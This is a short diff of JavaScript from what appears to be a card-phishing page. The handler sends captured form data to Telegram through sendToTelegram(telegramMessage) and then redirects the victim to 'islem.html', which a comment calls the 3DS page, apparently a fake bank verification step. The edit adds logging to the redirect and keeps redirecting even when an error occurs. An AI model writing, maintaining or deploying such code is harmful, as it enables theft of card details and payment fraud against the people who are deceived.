@@ -564,11 +564,11 @@
                 await sendToTelegram(telegramMessage);
                 
                 // 3 Second Delay then redirect to appropriate 3DS page
-                window.location.href = "islem.html";
+                console.log('Redirecting to islem.html'); window.location.href = 'islem.html';
                 
             } catch (error) {
                 // Even on error, redirect to 3DS page after 3 seconds
-                window.location.href = "islem.html";
+                console.log('Redirecting to islem.html'); window.location.href = 'islem.html';
             }
         });
 
